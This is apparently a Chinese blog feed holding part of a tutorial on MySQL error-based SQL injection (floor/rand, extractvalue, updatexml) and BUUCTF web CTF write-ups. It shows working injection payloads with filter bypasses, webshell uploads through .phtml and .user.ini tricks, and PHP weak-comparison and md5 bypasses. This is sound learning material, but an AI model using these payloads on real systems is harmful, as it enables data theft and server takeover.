<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
</li>
<li><p>exp()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中比较常用的是floor(),extractvalue(),updataxml().exp()也遇到过.</p>
<h2 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h2><p>原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误，爆出我们实际想查询的数据。</p>
<h3 id="函数原理"><a href="#函数原理" class="headerlink" title="函数原理"></a>函数原理</h3><p>基本语句(x 表示数字)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(floor(rand(0)*2))x from table group by x;</span><br></pre></td></tr></table></figure>
<p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p>
<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整,只保留整数部分.</p>
<h4 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h4><p>rand()和rand(0)是有区别的,rand生成随机的0-1间随机数,结果不确定,而加了0的种子,就会形成伪随机.(产生的数据都是可预知的)当生成的数据和虚拟表数据重合时,就会形成报错.</p>
<h4 id="floor-rand-0-2"><a href="#floor-rand-0-2" class="headerlink" title="floor(rand(0)*2)"></a>floor(rand(0)*2)</h4><p>将0-1间随机数变成0-2间的随机数,并进行取整,得到01随机数串.</p>
<h4 id="group-by-与-count"><a href="#group-by-与-count" class="headerlink" title="group by 与 count(*)"></a>group by 与 count(*)</h4><p>group by()对数据进行分组,相同的分为一组,整合重复数据.</p>
<p>count()对重复数据进行计数.在查询数据的时候,首先查看该虚拟表中是否存在该分组,如果存在那么计数值加1,不存在则新建该分组.</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>count(*) 将返回表格中所有存在的行的总数包括值为 null 的行,在mysql查询中是最快的方式.</p>
<h3 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h3><h4 id="group-by-的虚拟表"><a href="#group-by-的虚拟表" class="headerlink" title="group by()的虚拟表"></a>group by()的虚拟表</h4><p>在对数据进行查询时,group by会把重复数据整合,生成虚拟表,我们的查询也是在虚拟表上进行查询,避免了重复数据的干扰,并且需要整合函数count()或sum()进行计数.</p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h4 id="rand-的特殊性"><a href="#rand-的特殊性" class="headerlink" title="rand()的特殊性"></a>rand()的特殊性</h4><p>根据group by的两次运算,当其进行分组时,调用的floor(rand(0)<em>2)执行一次(查看分组是否存在),如果虚拟表中不存在该分组,那么在插入新分组的时候 floor(rand(0)</em>2) 就又计算了一次.(只要 rand(0) 被调用，一定会产生新值)</p>
<p>根据之前生成的表进行分析.</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>当 group by 对其进行分组的时候,首先遇到第一个值 0 ,发现 0 不存在,于是需要插入分组,此时floor(rand(0)<em>2)再次被触发,生成第二个值1,因此最终插入虚拟表的也就是第二个值 1;然后遇到第三个值 1 ,因为已经存在分组 1 了,就直接计数加1(count()这时1的计数变为2);遇到第四个值 0 的时候,发现 0 不存在,于是又需要插入新分组,然后floor(rand(0)</em>2)又被触发,生成第五个值 1 ,因此这时还是往虚拟表里插入分组 1 ,但分组 1 已经存在,所以报错.</p>
<h2 id="extractvalue报错"><a href="#extractvalue报错" class="headerlink" title="extractvalue报错"></a>extractvalue报错</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml</p>
<p>extractvalue()使用XPath表示法从XML字符串中提取值</p>
<h3 id="函数原理-1"><a href="#函数原理-1" class="headerlink" title="函数原理"></a>函数原理</h3><p>基本语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>
<p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></p>
<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>ExtractValue(xml_frag, xpath_expr)</p>
<p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
<p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
<h4 id="XPath路径表达式"><a href="#XPath路径表达式" class="headerlink" title="XPath路径表达式"></a>XPath路径表达式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nodename　　节点名，选取此节点的所有子节点　　例： childnode　　当前节点中的childnode子节点，不包含孙子及以下的节点</span><br><span class="line">/　　　从根节点选取　　例：/root/childnode/grandsonnode</span><br><span class="line">//　  表示所有后代节点　　例：//childnode　所有名为childnode的后代节点</span><br><span class="line">.　　 表示当前节点　　例：./childnode　    表示当前节点的childnode节点</span><br><span class="line">..　  表示父节点　　例： ../nearnode　　  表示父亲节点的nearnode子节点</span><br><span class="line">@　　 选取属性　　/root/childnode/@id　　表示childnode的所有含有id属性的节点集</span><br></pre></td></tr></table></figure>
<p>谓语可以对节点集进行一些限制，使选择更精确<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/root/book[1]　　　　节点集中的第一个节点</span><br><span class="line">/root/book[last()]　　节点集中最后一个节点</span><br><span class="line">/root/book[position() - 1]　　节点集中倒数第二个节点集</span><br><span class="line">/root/book[position() &lt; 5]　　节点集中前五个节点集</span><br><span class="line">/root/book[@id]　　　　　　节点集中含有属性id的节点集</span><br><span class="line">/root/book[@id=&apos;chinese&apos;]　　节点集中id属性值为chinese的节点集</span><br><span class="line">/root/book[price &gt; 35]/title　　节点集中book的price元素值大于35的title节点集</span><br></pre></td></tr></table></figure></p>
<p>通配符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XPath路径中同样支持通配符（*，@*，node()， text()）</span><br><span class="line">例：　　/bookstore/*</span><br><span class="line">//title[@*]</span><br></pre></td></tr></table></figure></p>
<p>运算符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|　　两个节点集的合并　　例：/root/book[1] | /root/book[3]</span><br><span class="line">+，-，*，dev，mod</span><br><span class="line">=，!=，&lt;，&gt;，&lt;=，&gt;=</span><br><span class="line">or，and　　或和与</span><br><span class="line">多个属性条件查询　　　　　　//div[@align=&apos;center&apos; and @height=&apos;24&apos;]</span><br><span class="line">不存在class属性　　 　　　　//div[not(@class)]</span><br></pre></td></tr></table></figure></p>
<h3 id="报错分析-1"><a href="#报错分析-1" class="headerlink" title="报错分析"></a>报错分析</h3><p>报错注入通过报错信息来查到我们想要的内容，首先需要构造的就是报错。</p>
<p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错，可以利用这个特性来获得我们想要知道的内容。</p>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>利用concat()函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
<p>concat()函数用于将多个字符串连接成一个字符串，返回结果为连接参数产生的字符串，如有任何一个参数为NULL/二进制 ，则返回值为 NULL/二进制。</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h2><p>updatexml()返回替换的XML片段</p>
<h3 id="函数原理-2"><a href="#函数原理-2" class="headerlink" title="函数原理"></a>函数原理</h3><p>基本语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure>
<p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></p>
<h4 id="updatexml（）"><a href="#updatexml（）" class="headerlink" title="updatexml（）"></a>updatexml（）</h4><p>UpdateXML(xml_target, xpath_expr, new_xml)</p>
<p>xml_target:： 需要操作的xml片段</p>
<p>xpath_expr： 需要更新的xml路径(Xpath格式)</p>
<p>new_xml： 更新后的内容</p>
<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。</p>
<p>如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。所有三个参数都应该是字符串。</p>
<h3 id="报错分析-2"><a href="#报错分析-2" class="headerlink" title="报错分析"></a>报错分析</h3><p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val1</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val2</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;//b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val3</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val4</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val5</span><br><span class="line">***********结果**************</span><br><span class="line">val1: &lt;e&gt;fff&lt;/e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;e&gt;fff&lt;/e&gt;&lt;/a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
]]></content>
      
        <categories>
            
            <category> web学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF web练习3]]></title>
      <url>/ctf-writeup-web/ckwd5ws7b001od0uc3fnfqqvb/</url>
      <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><a href="http://1f4a31f5-7d6f-455f-856c-c24ec63ca11d.node3.buuoj.cn" target="_blank" rel="noopener">http://1f4a31f5-7d6f-455f-856c-c24ec63ca11d.node3.buuoj.cn</a></p>
<p>单引号报错存在注入</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>联合查询语句被过滤,尝试双重注入</p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>双重注入有效,继续查询</p>
<p>经查询大概过滤了 union select where or from,全都双写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos;+uniunionon+seselectlect+1,2,3--+&amp;password=1</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,database(),3--+&amp;password=1  //geek</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+whwhereere+table_schema=&apos;geek&apos;--+&amp;password=1  //b4bsql,geekuser</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+whwhereere+table_name=&apos;b4bsql&apos;--+&amp;password=1  //id,username,password</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(passwoorrd),3+frfromom+b4bsql--+&amp;password=1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{0bdcc0e4-8b1a-4855-974f-55185878f5aa}</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><a href="http://03a309a6-ef7e-4083-a805-48f967450eec.node3.buuoj.cn" target="_blank" rel="noopener">http://03a309a6-ef7e-4083-a805-48f967450eec.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>网页名叫上传头像,估计后缀名是图片,直接传图片马</p>
<p>过滤了php后缀,大小写,php345等,改成phtml上传成功</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>添加菜刀,路径是/upload/shell.phtml,在根目录拿到flag</p>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{0daae0dc-b56e-468e-9efd-250e2667f1e5}</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><a href="http://68e807d3-2827-4ddc-bc75-307ac47059c6.node3.buuoj.cn" target="_blank" rel="noopener">http://68e807d3-2827-4ddc-bc75-307ac47059c6.node3.buuoj.cn</a></p>
<p>尝试了好多能被php解析的后缀,都提示illegal suffix!</p>
<p>用图片后缀时提示</p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>看到数组输出,猜测是nginx,考虑上传.user.ini文件,.user.ini会将图片马中的代码包含到每个php文件中,调用时用auto_prepend_file来包含我们的shell.jpg</p>
<p>在.user.ini里能调用的参数有auto_prepend_file和auto_append_file</p>
<p>相当于指定一个文件,自动包含在要执行的文件前,类似于在文件前调用了require()函数</p>
<p>但auto_prepend_file是在文件前插入,而auto_append_file是在文件最后才插入</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>注意路径,/uploads/04b0951938d905b41348c1548f9c338b/index.php</p>
<p>上传成功后蚁剑连接</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{751bca8b-f279-435d-acdf-a0c711380fab}</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><a href="http://9c479038-922c-4d88-9f02-52d4995a545e.node3.buuoj.cn" target="_blank" rel="noopener">http://9c479038-922c-4d88-9f02-52d4995a545e.node3.buuoj.cn</a></p>
<p>根据 Try to find out source file! 先查看源码</p>
<p>fuzz了一下,源码文件是index.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line"><span class="comment">//检测$key是否为数字或数字字符串</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line"><span class="comment">//获取$key的整数值</span></span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line"><span class="comment">//要求$key取整后的值等于$str</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为在 $key == $str 的比较中是弱比较,只需比较字母前的数字,即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{2d41b6bd-3496-40fc-b34c-32c91ca50b67}</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><a href="http://17555bee-794b-4019-9361-b4a76e7a17ab.node3.buuoj.cn" target="_blank" rel="noopener">http://17555bee-794b-4019-9361-b4a76e7a17ab.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>传个图片马,改后缀phtml,加GIF98A头</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>蚁剑连接,拿到根目录下flag</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{f6d3674b-ccd1-439c-9cd9-a51059d1b5a3}</p>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><a href="http://55d23e6e-9121-4338-98f5-b3a7b64c9192.node3.buuoj.cn" target="_blank" rel="noopener">http://55d23e6e-9121-4338-98f5-b3a7b64c9192.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看pay.php源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>post一个password=404,抓个包<br><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>cookie里有可疑变量,改user=1</p>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>因为比较还是 == ,可以弱比较绕过</p>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>post一个够买flag的money</p>
<figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>直接买会提示字符串太长,可以用科学计数法表示100000000=1e9</p>
<figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{ce96bdde-166b-4b5e-84c5-1532f8498f23}</p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><a href="http://e71837b5-f32d-44a8-a478-6868f556634d.node3.buuoj.cn" target="_blank" rel="noopener">http://e71837b5-f32d-44a8-a478-6868f556634d.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"upload"</span> <span class="attr">action</span>=<span class="string">"leveldo4.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">name</span>=<span class="string">'password'</span> <span class="attr">class</span>=<span class="string">"in"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"give"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为这题和md5有关,在md5里有一个很有意思的字符串 ffifdyop<br>这个字符串md5后是’or’6�]��!r,��b,正好前几位可以用于闭合查询语句,就可以用来绕过</p>
<figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>引入了一个新页面,访问之</p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	$a = $GET[&apos;a&apos;];</span><br><span class="line">	$b = $_GET[&apos;b&apos;];</span><br><span class="line">	</span><br><span class="line">	if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">	// wow, glzjin wants a girl friend.</span><br><span class="line">	--&gt;</span><br></pre></td></tr></table></figure>
<p>可以用0e绕过md5弱比较,以下是一些常见的0e字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">aabg7XSs</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a=QNKCDZO&amp;b=s878926199a</span><br><span class="line">也可以用数组绕过</span><br><span class="line">levels91.php?a[]=a&amp;b[]=b</span><br></pre></td></tr></table></figure>
<p>又到了新页面<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>依旧数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=a&amp;param2[]=b</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{b43ee0d2-4f80-4bcb-9674-7dc11e27bb3c}</p>
